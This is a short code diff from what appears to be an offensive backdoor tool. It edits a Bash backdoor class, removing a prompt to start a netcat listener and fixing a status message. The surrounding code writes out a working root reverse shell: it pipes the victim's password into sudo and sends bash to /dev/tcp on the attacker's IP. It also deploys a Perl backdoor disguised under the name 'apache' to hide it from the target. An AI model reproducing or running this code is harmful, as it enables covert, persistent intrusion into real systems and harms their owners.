@@ -29,7 +29,6 @@ class Bash(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
 
-        raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
         print(GOOD + "Initializing backdoor...")
         self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % port)
         print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)
@@ -54,7 +53,7 @@ class Bash(Backdoor):
         self.target.scpFiles(self, 'perl/prsA.pl', False)
         print("Moving the backdoor script.")
         self.target.ssh.exec_command(self.command)
-        print("Perl backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop." % port)
+        print("Bash backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop." % port)
 
 
 
